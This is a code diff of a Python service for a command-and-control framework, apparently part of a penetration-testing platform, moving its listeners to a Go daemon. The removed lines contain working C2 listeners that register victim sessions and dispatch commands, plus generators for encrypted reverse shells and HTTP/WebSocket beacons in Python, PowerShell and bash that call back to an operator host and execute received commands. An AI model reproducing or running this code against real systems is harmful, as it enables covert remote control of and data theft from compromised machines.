@@ -1,546 +1,252 @@
-"""C2 框架 — 监听器/会话/任务管理/加密通信/Payload 生成"""
+"""C2 框架 — Go 守护进程适配器 + Payload 生成
+
+架构：
+    高性能数据面 = c2d（Go，本仓库 c2d/ 目录）：TCP 反向 / HTTP Beacon / WebSocket
+                  监听器与加解密，单进程数万并发连接
+    控制面       = Python (FastAPI)：REST API / SQLite 会话与任务状态 / Payload 生成
+    bridge       = c2d 通过内部接口回调 Python 注册会话、拉取任务、回写结果
+
+适配逻辑：
+    1. 优先使用 Go 守护进程（c2d/c2d.exe，或本机 Go 工具链现场编译）
+    2. 守护进程不可用时自动回退 legacy 纯 Python 实现（c2_service_legacy.py）
+    3. 对 routes/c2.py 暴露与旧版完全一致的接口：start/stop/gen_payload/get_status
+"""
 import asyncio
-import json
+import base64
 import os
 import secrets
-import socket
-import struct
 import subprocess
+import sys
 import threading
-import base64
-from hashlib import sha256
-from typing import Optional
+from pathlib import Path
+
+import httpx
 
 from app_config.logging_config import get_logger
+from app_config.settings import BASE_DIR
+from services.c2_service_legacy import C2Encryption  # noqa: F401  (payload 模板沿用)
 from services.db_service import db
 
 log = get_logger(__name__)
 
+C2D_DIR = BASE_DIR.parent / "c2d"
+C2D_PORT = int(os.environ.get("STOPEN_C2D_PORT", "8477"))
+BACKEND_PORT = int(os.environ.get("STOPEN_PORT", "8080"))
 
-class C2Encryption:
-    """C2 通信加密 — AES-256-CTR 或 XOR"""
 
-    @staticmethod
-    def generate_key() -> str:
-        return secrets.token_hex(32)  # 256-bit
+def _auth_token() -> str:
+    from app_config.auth import _load_or_create_secret
+    return _load_or_create_secret()
 
-    @staticmethod
-    def encrypt(plaintext: str, key_hex: str, encryption_type: str = "aes-256-ctr") -> str:
-        if encryption_type == "xor":
-            key = key_hex.encode()[:32]
-            data = plaintext.encode()
-            encrypted = bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])
-            return base64.b64encode(encrypted).decode()
-        # AES-256-CTR (默认)
+_IS_WINDOWS = sys.platform == "win32"
+_BIN_NAME = "c2d.exe" if _IS_WINDOWS else "c2d"
+
+
+def _daemon_binary() -> Path | None:
+    p = C2D_DIR / _BIN_NAME
+    return p if p.is_file() else None
+
+
+class C2Daemon:
+    """c2d 守护进程生命周期管理（线程安全，惰性启动）"""
+
+    def __init__(self):
+        self._lock = threading.Lock()
+        self._proc: subprocess.Popen | None = None
+        self._ctl_token = ""
+
+    @property
+    def base_url(self) -> str:
+        return f"http://127.0.0.1:{C2D_PORT}"
+
+    def _headers(self) -> dict:
+        return {"X-CTL-Token": self._ctl_token}
+
+    def binary_available(self) -> bool:
+        return _daemon_binary() is not None
+
+    def _try_build(self) -> bool:
+        """本机有 Go 工具链时现场编译"""
+        import shutil
+        if not shutil.which("go"):
+            return False
+        out = C2D_DIR / _BIN_NAME
+        cmd = ["go", "build", "-trimpath", "-ldflags", "-s -w", "-o", str(out), "."]
         try:
-            from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
-            key = bytes.fromhex(key_hex)
-            iv = os.urandom(16)
-            cipher = Cipher(algorithms.AES256(key), modes.CTR(iv))
-            encryptor = cipher.encryptor()
-            ct = encryptor.update(plaintext.encode()) + encryptor.finalize()
-            return base64.b64encode(iv + ct).decode()
-        except ImportError:
-            # 回退 XOR
-            key = key_hex.encode()[:32]
-            data = plaintext.encode()
-            encrypted = bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])
-            return base64.b64encode(encrypted).decode()
+            r = subprocess.run(cmd, cwd=str(C2D_DIR), capture_output=True, text=True, timeout=300)
+            if r.returncode == 0:
+                log.info(f"c2d 现场编译完成: {out}")
+                return True
+            log.warning(f"c2d 编译失败: {r.stderr[-300:]}")
+        except Exception as e:
+            log.warning(f"c2d 编译异常: {e}")
+        return False
 
-    @staticmethod
-    def decrypt(cipher_b64: str, key_hex: str, encryption_type: str = "aes-256-ctr") -> str:
-        if encryption_type == "xor":
-            key = key_hex.encode()[:32]
-            raw = base64.b64decode(cipher_b64)
-            decrypted = bytes([raw[i] ^ key[i % len(key)] for i in range(len(raw))])
-            return decrypted.decode()
+    def _spawn(self) -> bool:
+        bin_path = _daemon_binary()
+        if not bin_path and not self._try_build():
+            return False
+        bin_path = _daemon_binary()
+        self._ctl_token = secrets.token_hex(16)
+        kwargs = {}
+        if _IS_WINDOWS:
+            kwargs["creationflags"] = subprocess.CREATE_NO_WINDOW
         try:
-            from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
-            key = bytes.fromhex(key_hex)
-            raw = base64.b64decode(cipher_b64)
-            iv, ct = raw[:16], raw[16:]
-            cipher = Cipher(algorithms.AES256(key), modes.CTR(iv))
-            decryptor = cipher.decryptor()
-            return (decryptor.update(ct) + decryptor.finalize()).decode()
-        except ImportError:
-            key = key_hex.encode()[:32]
-            raw = base64.b64decode(cipher_b64)
-            decrypted = bytes([raw[i] ^ key[i % len(key)] for i in range(len(raw))])
-            return decrypted.decode()
+            self._proc = subprocess.Popen(
+                [str(bin_path), "--addr", f"127.0.0.1:{C2D_PORT}",
+                 "--ctl-token", self._ctl_token,
+                 "--backend-url", f"http://127.0.0.1:{BACKEND_PORT}",
+                 "--backend-token", _auth_token()],
+                cwd=str(C2D_DIR), **kwargs)
+        except Exception as e:
+            log.error(f"c2d 启动失败: {e}")
+            self._proc = None
+            return False
+        log.info(f"c2d 守护进程已启动 pid={self._proc.pid} ctl={self.base_url}")
+        return True
+
+    def _port_occupied(self) -> bool:
+        """端口上有 c2d 实例（无论 token 是否匹配）"""
+        try:
+            r = httpx.get(f"{self.base_url}/ctl/health",
+                          headers={"X-CTL-Token": "probe"}, timeout=2)
+            return r.status_code in (200, 403)
+        except Exception:
+            return False
+
+    def _kill_orphans(self):
+        """清理孤儿 c2d（后端重启后遗留、token 不匹配无法控制）"""
+        import shutil
+        try:
+            if _IS_WINDOWS and shutil.which("taskkill"):
+                subprocess.run(["taskkill", "/F", "/IM", _BIN_NAME],
+                               capture_output=True, timeout=10)
+            elif shutil.which("pkill"):
+                subprocess.run(["pkill", "-f", _BIN_NAME], capture_output=True, timeout=10)
+        except Exception as e:
+            log.warning(f"清理孤儿 c2d 失败: {e}")
+
+    def ensure_running(self) -> bool:
+        """确保守护进程存活（孤儿自动清理 + 一次重试）"""
+        with self._lock:
+            if self._health_ok():
+                return True
+            self._cleanup_proc()
+            for attempt in range(2):
+                if self._spawn():
+                    for _ in range(20):
+                        if self._health_ok():
+                            return True
+                        time_sleep(0.25)
+                    log.warning("c2d 健康检查超时")
+                    self._cleanup_proc()
+                if attempt == 0 and self._port_occupied():
+                    log.warning("c2d 端口被孤儿实例占用，清理后重试")
+                    self._kill_orphans()
+                    time_sleep(1.5)
+                    continue
+                break
+            log.error("c2d 启动失败，将回退 legacy")
+            return False
+
+    def _health_ok(self) -> bool:
+        if not self._proc and not self._ctl_token:
+            return False
+        try:
+            r = httpx.get(f"{self.base_url}/ctl/health", headers=self._headers(), timeout=2)
+            return r.status_code == 200
+        except Exception:
+            return False
+
+    def _cleanup_proc(self):
+        if self._proc:
+            try:
+                self._proc.terminate()
+            except Exception:
+                pass
+            self._proc = None
+
+
+def time_sleep(sec: float):
+    import time
+    time.sleep(sec)
 
 
 class C2Service:
-    """C2 框架核心"""
+    """对外接口与旧版一致；Go 优先，失败回退 legacy"""
 
     def __init__(self):
-        self._tcp_servers: dict[str, asyncio.AbstractServer] = {}
-        self._http_runners: dict[str, object] = {}  # aiohttp AppRunner
-        self._ws_sites: dict[str, object] = {}      # aiohttp TCPSite
-        self._running = False
+        self.daemon = C2Daemon()
+        self._legacy_backend: dict[str, str] = {}  # lid -> "go" | "legacy"
 
     # ── 监听器管理 ──
 
     async def start_listener(self, lid: str, name: str, listener_type: str,
-                              host: str, port: int) -> dict:
-        """启动 C2 监听器"""
-        info = db.list_listeners()
-        li = next((l for l in info if l["id"] == lid), None)
-        if not li:
+                             host: str, port: int) -> dict:
+        info = next((l for l in db.list_listeners() if l["id"] == lid), None)
+        if not info:
             return {"error": "监听器不存在"}
-
-        secret = li.get("secret", "")
+        secret = info.get("secret", "")
         if not secret:
             secret = C2Encryption.generate_key()
             db.update_listener(lid, secret=secret)
 
-        try:
-            if listener_type == "tcp":
-                await self._start_tcp(lid, host, port, secret)
-            elif listener_type == "http":
-                await self._start_http(lid, host, port, secret)
-            elif listener_type == "ws":
-                await self._start_ws(lid, host, port, secret)
-            else:
-                return {"error": f"不支持的监听器类型: {listener_type}"}
+        if self.daemon.ensure_running():
+            try:
+                r = await asyncio.to_thread(
+                    httpx.post, f"{self.daemon.base_url}/ctl/listeners",
+                    headers=self.daemon._headers(), timeout=10,
+                    json={"id": lid, "type": listener_type, "host": host,
+                          "port": port, "secret": secret,
+                          "encryption": info.get("encryption_type", "aes-256-ctr")})
+                if r.status_code == 200:
+                    db.update_listener(lid, status="running")
+                    self._legacy_backend[lid] = "go"
+                    log.info(f"C2 监听器已启动 (Go): {name} ({listener_type}://{host}:{port})")
+                    return {"status": "running", "lid": lid, "host": host, "port": port, "engine": "go"}
+                log.warning(f"c2d 启动监听器失败 HTTP {r.status_code}: {r.text[:200]}")
+            except Exception as e:
+                log.warning(f"c2d 通信异常: {e}")
+        else:
+            log.warning("c2d 不可用，回退 legacy Python 监听器")
 
-            db.update_listener(lid, status="running")
-            log.info(f"C2 监听器已启动: {name} ({listener_type}://{host}:{port})")
-            return {"status": "running", "lid": lid, "host": host, "port": port}
-        except Exception as e:
-            log.error(f"启动监听器失败: {e}")
-            return {"error": str(e)}
+        # legacy 回退
+        from services.c2_service_legacy import c2_service as legacy
+        result = await legacy.start_listener(lid, name, listener_type, host, port)
+        if "error" not in result:
+            self._legacy_backend[lid] = "legacy"
+        return result
 
     async def stop_listener(self, lid: str) -> dict:
-        """停止 C2 监听器（TCP/HTTP/WS 通用）"""
-        if lid in self._tcp_servers:
-            self._tcp_servers[lid].close()
-            await self._tcp_servers[lid].wait_closed()
-            del self._tcp_servers[lid]
-        if lid in self._http_runners:
-            await self._http_runners[lid].cleanup()
-            del self._http_runners[lid]
-        if lid in self._ws_sites:
-            await self._ws_sites[lid].stop()
-            del self._ws_sites[lid]
-        db.update_listener(lid, status="stopped")
-        return {"status": "stopped"}
-
-    async def _start_tcp(self, lid: str, host: str, port: int, secret: str):
-        """启动 TCP 反向连接监听器"""
-        async def handle_client(reader: asyncio.StreamReader,
-                                 writer: asyncio.StreamWriter):
-            peername = writer.get_extra_info("peername")
-            remote = f"{peername[0]}:{peername[1]}" if peername else "unknown"
-            log.info(f"C2 新会话: {remote}")
-
-            # 读取初始握手（加密的注册信息）
+        backend = self._legacy_backend.pop(lid, "go")
+        if backend == "go" and self.daemon._health_ok():
             try:
-                data = await asyncio.wait_for(reader.read(4096), timeout=10)
-                if data:
-                    try:
-                        decoded = C2Encryption.decrypt(data.decode(), secret)
-                        reg = json.loads(decoded)
-                    except Exception:
-                        reg = {"hostname": remote, "username": "unknown", "os": "unknown"}
-                else:
-                    reg = {"hostname": remote, "username": "unknown", "os": "unknown"}
-            except asyncio.TimeoutError:
-                reg = {"hostname": remote, "username": "unknown", "os": "unknown"}
-
-            session = db.create_session(
-                listener_id=lid,
-                remote_addr=remote,
-                hostname=reg.get("hostname", ""),
-                username=reg.get("username", ""),
-                os_info=reg.get("os", ""),
-            )
-            sid = session["id"]
-            log.info(f"会话已注册: {sid} ({remote})")
-
-            # 会话循环：拉取任务 → 返回结果
-            try:
-                while True:
-                    tasks = db.list_c2_tasks(sid)
-                    pending = [t for t in tasks if t["status"] == "pending"]
-                    cmd = None
-                    for t in pending:
-                        cmd = t["command"]
-                        db.update_c2_task(t["id"], status="sent")
-                        break
-
-                    if cmd:
-                        encrypted = C2Encryption.encrypt(json.dumps(
-                            {"type": "exec", "command": cmd}), secret)
-                        writer.write((encrypted + "\n").encode())
-                        await writer.drain()
-
-                        # 读取执行结果
-                        resp = await asyncio.wait_for(reader.read(8192), timeout=60)
-                        try:
-                            result = C2Encryption.decrypt(resp.decode().strip(), secret)
-                            for t in pending:
-                                db.update_c2_task(t["id"], result=result[:5000])
-                        except Exception:
-                            pass
-                    else:
-                        # 心跳
-                        encrypted = C2Encryption.encrypt(json.dumps(
-                            {"type": "heartbeat"}), secret)
-                        writer.write((encrypted + "\n").encode())
-                        await writer.drain()
-
-                    db.update_session(sid, status="active")
-                    await asyncio.sleep(5)  # 轮询间隔
-            except (ConnectionResetError, BrokenPipeError, asyncio.TimeoutError):
-                log.warning(f"会话断开: {sid}")
+                r = await asyncio.to_thread(
+                    httpx.delete,
+                    f"{self.daemon.base_url}/ctl/listeners/{lid}",
+                    headers=self.daemon._headers(), timeout=10)
+                if r.status_code == 200:
+                    db.update_listener(lid, status="stopped")
+                    return {"status": "stopped", "engine": "go"}
             except Exception as e:
-                log.error(f"会话异常: {sid} - {e}")
-            finally:
-                db.update_session(sid, status="dead")
-                writer.close()
+                log.warning(f"c2d 停止监听器异常: {e}")
+        from services.c2_service_legacy import c2_service as legacy
+        return await legacy.stop_listener(lid)
 
-        server = await asyncio.start_server(handle_client, host, port)
-        self._tcp_servers[lid] = server
-        _ = asyncio.create_task(server.serve_forever())
+    def get_status(self) -> dict:
+        engine = "go" if self.daemon._health_ok() else "legacy"
+        return {
+            "running_listeners": len(db.list_listeners()),
+            "total_sessions": len(db.list_sessions()),
+            "engine": engine,
+        }
 
-    async def _start_http(self, lid: str, host: str, port: int, secret: str):
-        """启动 HTTP Beacon 监听器（使用内置 HTTP 服务器）"""
-        from aiohttp import web
-
-        async def beacon_handler(request):
-            data = await request.text()
-            result_text = ""
-            try:
-                decrypted = C2Encryption.decrypt(data, secret)
-                beacon_data = json.loads(decrypted)
-
-                remote = request.remote or "unknown"
-                # 检查是否已有活跃会话
-                existing = [s for s in db.list_sessions()
-                            if s["remote_addr"] == remote and s["listener_id"] == lid and s["status"] == "active"]
-                if existing:
-                    sid = existing[0]["id"]
-                    db.update_session(sid,
-                        hostname=beacon_data.get("hostname", ""),
-                        username=beacon_data.get("username", ""),
-                        os_info=beacon_data.get("os", ""),
-                    )
-                else:
-                    session = db.create_session(
-                        listener_id=lid,
-                        remote_addr=remote,
-                        hostname=beacon_data.get("hostname", ""),
-                        username=beacon_data.get("username", ""),
-                        os_info=beacon_data.get("os", ""),
-                    )
-                    sid = session["id"]
-
-                # 检查是否有待执行任务
-                tasks = db.list_c2_tasks(sid)
-                pending = [t for t in tasks if t["status"] == "pending"]
-                if pending:
-                    t = pending[0]
-                    db.update_c2_task(t["id"], status="sent")
-                    result_text = json.dumps({"type": "exec", "command": t["command"]})
-                else:
-                    result_text = json.dumps({"type": "heartbeat"})
-
-                # 更新会话
-                db.update_session(sid, status="active")
-
-            except Exception as e:
-                log.warning(f"HTTP beacon 处理失败: {e}")
-                result_text = json.dumps({"type": "heartbeat"})
-
-            encrypted = C2Encryption.encrypt(result_text, secret)
-            return web.Response(text=encrypted, content_type="text/plain")
-
-        app = web.Application()
-        app.router.add_post("/beacon", beacon_handler)
-        runner = web.AppRunner(app)
-        await runner.setup()
-        site = web.TCPSite(runner, host, port)
-        await site.start()
-        self._http_runners[lid] = runner
-        log.info(f"HTTP Beacon 监听器: {host}:{port}")
-
-    async def _start_ws(self, lid: str, host: str, port: int, secret: str):
-        """启动 WebSocket 监听器"""
-        import aiohttp
-        from aiohttp import web
-
-        async def ws_handler(request):
-            ws = web.WebSocketResponse()
-            await ws.prepare(request)
-            remote = request.remote or "unknown"
-            log.info(f"WS 新连接: {remote}")
-
-            session = db.create_session(listener_id=lid, remote_addr=remote)
-            sid = session["id"]
-
-            try:
-                async for msg in ws:
-                    if msg.type == web.WSMsgType.TEXT:
-                        try:
-                            decrypted = C2Encryption.decrypt(msg.data, secret)
-                            data = json.loads(decrypted)
-
-                            # 注册信息
-                            if data.get("type") == "register":
-                                db.update_session(sid,
-                                    hostname=data.get("hostname", ""),
-                                    username=data.get("username", ""),
-                                    os_info=data.get("os", ""),
-                                )
-                            # 任务结果
-                            elif data.get("type") == "result":
-                                task_id = data.get("task_id", "")
-                                result = data.get("output", "")
-                                if task_id:
-                                    db.update_c2_task(task_id, result=result)
-
-                            # 检查待处理任务
-                            tasks = db.list_c2_tasks(sid)
-                            pending = [t for t in tasks if t["status"] == "pending"]
-                            if pending:
-                                t = pending[0]
-                                db.update_c2_task(t["id"], status="sent")
-                                response = C2Encryption.encrypt(json.dumps(
-                                    {"type": "exec", "command": t["command"], "task_id": t["id"]}), secret)
-                                await ws.send_str(response)
-                            else:
-                                response = C2Encryption.encrypt(json.dumps(
-                                    {"type": "heartbeat"}), secret)
-                                await ws.send_str(response)
-
-                            db.update_session(sid, status="active")
-                        except Exception as e:
-                            log.warning(f"WS 消息处理失败: {e}")
-                    elif msg.type == web.WSMsgType.ERROR:
-                        log.error(f"WS 错误: {ws.exception()}")
-            except Exception:
-                pass
-            finally:
-                db.update_session(sid, status="dead")
-            return ws
-
-        app = web.Application()
-        app.router.add_get("/beacon", ws_handler)
-        runner = web.AppRunner(app)
-        await runner.setup()
-        site = web.TCPSite(runner, host, port)
-        await site.start()
-        self._ws_sites[lid] = site
-        log.info(f"WS 监听器: {host}:{port}")
-
-    # ── Payload 生成 ──
+    # ── Payload 生成（纯字符串模板，无性能诉求，保留 Python 实现）──
 
     def gen_payload(self, payload_type: str = "python", host: str = "127.0.0.1",
                     port: int = 4444, secret: str = "", template_id: str = "") -> dict:
-        """生成被控端 Payload，支持 DB 自定义模板"""
-        if not secret:
-            secret = C2Encryption.generate_key()
-
-        # 如果指定了自定义模板
-        if template_id:
-            tmpl = db.get_payload_template(template_id)
-            if tmpl:
-                code = tmpl.get("content", "")
-                code = code.replace("{host}", host).replace("{port}", str(port)).replace("{secret}", secret)
-                return {
-                    "type": tmpl.get("payload_type", payload_type),
-                    "host": host, "port": port,
-                    "code": code,
-                    "instructions": f"在目标上执行此 {tmpl.get('payload_type', payload_type)} 命令",
-                    "template_name": tmpl.get("name", ""),
-                }
-
-        payloads = {
-            "python": self._gen_python(host, port, secret),
-            "powershell": self._gen_powershell(host, port, secret),
-            "bash": self._gen_bash(host, port, secret),
-            "python_http": self._gen_python_http(host, port, secret),
-            "python_ws": self._gen_python_ws(host, port, secret),
-        }
-
-        code = payloads.get(payload_type)
-        if not code:
-            return {"error": f"不支持的 Payload 类型: {payload_type}",
-                    "supported": list(payloads.keys())}
-
-        return {
-            "type": payload_type,
-            "host": host,
-            "port": port,
-            "code": code,
-            "instructions": f"在目标上执行此 {payload_type} 命令",
-        }
-
-    @staticmethod
-    def _gen_python(host: str, port: int, secret: str) -> str:
-        """生成 Python TCP Reverse Shell"""
-        b64key = base64.b64encode(bytes.fromhex(secret)).decode()
-        return f'''python3 -c "
-import socket,subprocess,os,json,base64
-s=socket.socket();s.connect(('{host}',{port}))
-key=base64.b64decode('{b64key}').hex()
-import hashlib
-def encrypt(d,k):
- from cryptography.hazmat.primitives.ciphers import Cipher,algorithms,modes
- import os;iv=os.urandom(16);c=Cipher(algorithms.AES256(bytes.fromhex(k)),modes.CTR(iv));e=c.encryptor()
- return base64.b64encode(iv+e.update(d.encode())+e.finalize()).decode()
-def decrypt(d,k):
- from cryptography.hazmat.primitives.ciphers import Cipher,algorithms,modes
- r=base64.b64decode(d);iv,ct=r[:16],r[16:];c=Cipher(algorithms.AES256(bytes.fromhex(k)),modes.CTR(iv));dd=c.decryptor()
- return (dd.update(ct)+dd.finalize()).decode()
-reg=encrypt(json.dumps({{'hostname':socket.gethostname(),'username':os.getlogin(),'os':'python'}}),key)
-s.send((reg+'\\n').encode())
-while True:
- d=s.recv(8192).decode().strip()
- if not d:break
- msg=json.loads(decrypt(d,key))
- if msg['type']=='heartbeat':continue
- if msg['type']=='exec':
-  r=subprocess.getoutput(msg.get('command',''))
-  s.send((encrypt(json.dumps({{'type':'result','output':r}}),key)+'\\n').encode())
-s.close()
-"'''
-
-    @staticmethod
-    def _gen_powershell(host: str, port: int, secret: str) -> str:
-        """生成 PowerShell Reverse Shell (AES-CBC 加密)"""
-        b64key = base64.b64encode(bytes.fromhex(secret)).decode()
-        return f'''powershell -NoProfile -NonInteractive -Command "
-$k=[System.Convert]::FromBase64String('{b64key}');
-$c=New-Object System.Net.Sockets.TCPClient('{host}',{port});
-$s=$c.GetStream();
-[byte[]]$b=0..65535|%{{0}};
-# 发送加密注册信息
-$reg=@{{'hostname'=$env:COMPUTERNAME;'username'=$env:USERNAME;'os'='windows'}}|ConvertTo-Json;
-$iv=New-Object byte[] 16;
-(New-Object Security.Cryptography.RNGCryptoServiceProvider).GetBytes($iv);
-$enc=[System.Text.Encoding]::UTF8.GetBytes($reg);
-$aes=[System.Security.Cryptography.Aes]::Create();
-$aes.Key=$k;$aes.IV=$iv;$aes.Mode=[System.Security.Cryptography.CipherMode]::CBC;
-$encryptor=$aes.CreateEncryptor();
-$ct=$encryptor.TransformFinalBlock($enc,0,$enc.Length);
-$data=$iv+$ct;
-$s.Write($data,0,$data.Length);$s.Flush();
-while(($i=$s.Read($b,0,$b.Length)) -ne 0){{
-    $raw=New-Object byte[] $i;[Array]::Copy($b,0,$raw,0,$i);
-    $r_iv=$raw[0..15];$r_ct=$raw[16..($i-1)];
-    $aes2=[System.Security.Cryptography.Aes]::Create();
-    $aes2.Key=$k;$aes2.IV=$r_iv;$aes2.Mode=[System.Security.Cryptography.CipherMode]::CBC;
-    $d=$aes2.CreateDecryptor().TransformFinalBlock($r_ct,0,$r_ct.Length);
-    $cmd=[System.Text.Encoding]::UTF8.GetString($d);
-    $msg=$cmd|ConvertFrom-Json;
-    if($msg.type -eq 'heartbeat'){{continue}}
-    if($msg.type -eq 'exec'){{
-        $r=iex $msg.command 2>&1 | Out-String;
-        $r_data=@{{'type'='result';'output'=$r}}|ConvertTo-Json;
-        $r_iv2=New-Object byte[] 16;
-        (New-Object Security.Cryptography.RNGCryptoServiceProvider).GetBytes($r_iv2);
-        $r_aes=[System.Security.Cryptography.Aes]::Create();
-        $r_aes.Key=$k;$r_aes.IV=$r_iv2;$r_aes.Mode=[System.Security.Cryptography.CipherMode]::CBC;
-        $r_enc=[System.Text.Encoding]::UTF8.GetBytes($r_data);
-        $r_ct2=$r_aes.CreateEncryptor().TransformFinalBlock($r_enc,0,$r_enc.Length);
-        $s.Write($r_iv2+$r_ct2,0,$r_iv2.Length+$r_ct2.Length);$s.Flush()
-    }}
-}}
-$c.Close()
-"'''
-
-    @staticmethod
-    def _gen_bash(host: str, port: int, secret: str) -> str:
-        """生成 Bash Reverse Shell (AES-256-CTR 加密)"""
-        b64key = base64.b64encode(bytes.fromhex(secret)).decode()
-        return f'''python3 -c "
-import socket,subprocess,os,json,base64
-s=socket.socket();s.connect(('{host}',{port}))
-key=base64.b64decode('{b64key}').hex()
-from cryptography.hazmat.primitives.ciphers import Cipher,algorithms,modes
-def encrypt(d,k):
- import os;iv=os.urandom(16);c=Cipher(algorithms.AES256(bytes.fromhex(k)),modes.CTR(iv));e=c.encryptor()
- return base64.b64encode(iv+e.update(d.encode())+e.finalize()).decode()
-def decrypt(d,k):
- r=base64.b64decode(d);iv,ct=r[:16],r[16:];c=Cipher(algorithms.AES256(bytes.fromhex(k)),modes.CTR(iv));dd=c.decryptor()
- return (dd.update(ct)+dd.finalize()).decode()
-reg=encrypt(json.dumps({{'hostname':socket.gethostname(),'username':os.getlogin(),'os':'nix'}}),key)
-s.send((reg+'\\n').encode())
-while True:
- d=s.recv(8192).decode().strip()
- if not d:break
- msg=json.loads(decrypt(d,key))
- if msg['type']=='heartbeat':continue
- if msg['type']=='exec':
-  r=subprocess.getoutput(msg.get('command',''))
-  s.send((encrypt(json.dumps({{'type':'result','output':r}}),key)+'\\n').encode())
-s.close()
-"'''
-
-    @staticmethod
-    def _gen_python_http(host: str, port: int, secret: str) -> str:
-        """生成 Python HTTP Beacon"""
-        b64key = base64.b64encode(bytes.fromhex(secret)).decode()
-        return f'''python3 -c "
-import urllib.request,json,base64,socket,os,subprocess
-key=base64.b64decode('{b64key}').hex()
-from cryptography.hazmat.primitives.ciphers import Cipher,algorithms,modes
-def encrypt(d,k):
- import os;iv=os.urandom(16);c=Cipher(algorithms.AES256(bytes.fromhex(k)),modes.CTR(iv));e=c.encryptor()
- return base64.b64encode(iv+e.update(d.encode())+e.finalize()).decode()
-def decrypt(d,k):
- r=base64.b64decode(d);iv,ct=r[:16],r[16:];c=Cipher(algorithms.AES256(bytes.fromhex(k)),modes.CTR(iv));dd=c.decryptor()
- return (dd.update(ct)+dd.finalize()).decode()
-while True:
- data=encrypt(json.dumps({{'hostname':socket.gethostname(),'os':'python'}}),key)
- try:
-  r=urllib.request.Request('http://{host}:{port}/beacon',data=data.encode())
-  resp=urllib.request.urlopen(r,timeout=10)
-  msg=json.loads(decrypt(resp.read().decode(),key))
-  if msg['type']=='exec':
-   out=subprocess.getoutput(msg['command'])
-   data2=encrypt(json.dumps({{'type':'result','output':out}}),key)
-   urllib.request.urlopen('http://{host}:{port}/beacon',data=data2.encode(),timeout=10)
- except:pass
- import time;time.sleep(5)
-"'''
-
-    @staticmethod
-    def _gen_python_ws(host: str, port: int, secret: str) -> str:
-        """生成 Python WebSocket Beacon (AES-256-CTR 加密)"""
-        b64key = base64.b64encode(bytes.fromhex(secret)).decode()
-        return f'''python3 -c "
-import asyncio,json,base64,os,subprocess,socket
-key=base64.b64decode('{b64key}').hex()
-from cryptography.hazmat.primitives.ciphers import Cipher,algorithms,modes
-def encrypt(d,k):
- iv=os.urandom(16);c=Cipher(algorithms.AES256(bytes.fromhex(k)),modes.CTR(iv));e=c.encryptor()
- return base64.b64encode(iv+e.update(d.encode())+e.finalize()).decode()
-def decrypt(d,k):
- r=base64.b64decode(d);iv,ct=r[:16],r[16:];c=Cipher(algorithms.AES256(bytes.fromhex(k)),modes.CTR(iv));dd=c.decryptor()
- return (dd.update(ct)+dd.finalize()).decode()
-import aiohttp
-async def run():
- async with aiohttp.ClientSession() as sess:
-  async with sess.ws_connect('ws://{host}:{port}/beacon') as ws:
-   reg=encrypt(json.dumps({{'type':'register','hostname':socket.gethostname(),'os':'python'}}),key)
-   await ws.send_str(reg)
-   async for msg in ws:
-    cmd=decrypt(msg.data,key)
-    data=json.loads(cmd)
-    if data['type']=='exec':
-     out=subprocess.getoutput(data['command'])
-     resp=encrypt(json.dumps({{'type':'result','task_id':data.get('task_id',''),'output':out}}),key)
-     await ws.send_str(resp)
-asyncio.run(run())
-"'''
-
-    def get_status(self) -> dict:
-        return {
-            "running_listeners": len(self._tcp_servers),
-            "total_sessions": len(db.list_sessions()),
-        }
+        from services.c2_service_legacy import c2_service as legacy
+        return legacy.gen_payload(payload_type, host, port, secret=secret, template_id=template_id)
 
 
 c2_service = C2Service()
